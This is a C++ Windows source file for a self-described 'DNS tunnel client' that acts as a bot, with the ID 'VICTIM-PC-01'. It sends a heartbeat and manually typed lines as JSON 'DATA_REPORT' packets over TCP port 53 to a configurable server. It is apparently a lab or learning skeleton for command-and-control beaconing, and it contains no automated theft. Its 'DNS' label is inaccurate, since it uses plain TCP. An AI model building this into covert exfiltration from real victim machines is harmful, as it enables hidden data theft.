#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string>
#include <sstream>
#include <ctime>

#pragma comment(lib, "ws2_32.lib")

using namespace std;

// Configuration
const char* SERVER_IP = "127.0.0.1";  // Change to your server IP
const int SERVER_PORT = 53;
const char* BOT_ID = "VICTIM-PC-01";

// Global socket
SOCKET clientSocket = INVALID_SOCKET;

// Get current timestamp in ISO 8601 format
string GetCurrentTimestamp() {
    time_t now = time(0);
    struct tm tstruct;
    char buf[80];
    localtime_s(&tstruct, &now);
    strftime(buf, sizeof(buf), "%Y-%m-%dT%H:%M:%S", &tstruct);
    return string(buf);
}

// Escape JSON string
string EscapeJsonString(const string& input) {
    string output;
    for (char c : input) {
        switch (c) {
        case '"': output += "\\\""; break;
        case '\\': output += "\\\\"; break;
        case '\b': output += "\\b"; break;
        case '\f': output += "\\f"; break;
        case '\n': output += "\\n"; break;
        case '\r': output += "\\r"; break;
        case '\t': output += "\\t"; break;
        default:
            if ('\x00' <= c && c <= '\x1f') {
                char buf[8];
                sprintf_s(buf, "\\u%04x", (int)c);
                output += buf;
            }
            else {
                output += c;
            }
        }
    }
    return output;
}

// Create JSON packet
string CreateJsonPacket(const string& messageType, const string& payloadType, const string& content) {
    stringstream json;
    json << "{"
        << "\"bot_id\":\"" << BOT_ID << "\","
        << "\"timestamp\":\"" << GetCurrentTimestamp() << "\","
        << "\"message_type\":\"" << messageType << "\","
        << "\"payload\":{"
        << "\"type\":\"" << payloadType << "\","
        << "\"content\":\"" << EscapeJsonString(content) << "\""
        << "}"
        << "}";
    return json.str();
}

// Create DNS-like packet format
string CreateDNSPacket(const string& jsonData) {
    // Simple format: [4 bytes length][JSON data]
    string packet;
    uint32_t length = (uint32_t)jsonData.length();
    packet.append((char*)&length, 4);
    packet.append(jsonData);
    return packet;
}

// Initialize connection to server
bool InitializeConnection() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cerr << "WSAStartup failed" << endl;
        return false;
    }

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        cerr << "Socket creation failed" << endl;
        WSACleanup();
        return false;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        cerr << "Connection failed. Error: " << WSAGetLastError() << endl;
        closesocket(clientSocket);
        clientSocket = INVALID_SOCKET;
        WSACleanup();
        return false;
    }

    cout << "Connected to server on port " << SERVER_PORT << endl;
    return true;
}

// Send data through DNS tunnel
bool SendDataTunnel(const string& data) {
    if (clientSocket == INVALID_SOCKET) {
        if (!InitializeConnection()) {
            return false;
        }
    }

    string packet = CreateDNSPacket(data);
    int result = send(clientSocket, packet.c_str(), (int)packet.length(), 0);

    if (result == SOCKET_ERROR) {
        cerr << "Send failed. Error: " << WSAGetLastError() << endl;
        closesocket(clientSocket);
        clientSocket = INVALID_SOCKET;
        return false;
    }

    cout << "Data sent (" << result << " bytes)" << endl;
    return true;
}

// Send manual input as JSON payload
void SendManualInput(const string& content) {
    string jsonPacket = CreateJsonPacket("DATA_REPORT", "MANUAL", content);
    cout << "Sending: " << jsonPacket << endl;
    SendDataTunnel(jsonPacket);
}

// Send heartbeat
void SendHeartbeat() {
    string jsonPacket = CreateJsonPacket("HEARTBEAT", "STATUS", "ONLINE");
    SendDataTunnel(jsonPacket);
}

int main() {
    cout << "=== DNS Tunnel Client (manual input mode) ===" << endl;
    cout << "Bot ID: " << BOT_ID << endl;
    cout << "Server: " << SERVER_IP << ":" << SERVER_PORT << endl;
    cout << "Type lines and press Enter to send. Type 'exit' to quit." << endl << endl;

    if (!InitializeConnection()) {
        cerr << "Failed to initialize connection. Exiting..." << endl;
        return 1;
    }

    SendHeartbeat();

    string line;
    while (true) {
        cout << "> ";
        if (!std::getline(cin, line)) break; // EOF
        if (line == "exit") break;
        if (line.empty()) continue;
        SendManualInput(line);
    }

    // Cleanup
    if (clientSocket != INVALID_SOCKET) closesocket(clientSocket);
    WSACleanup();

    cout << "Client exiting." << endl;
    return 0;
}
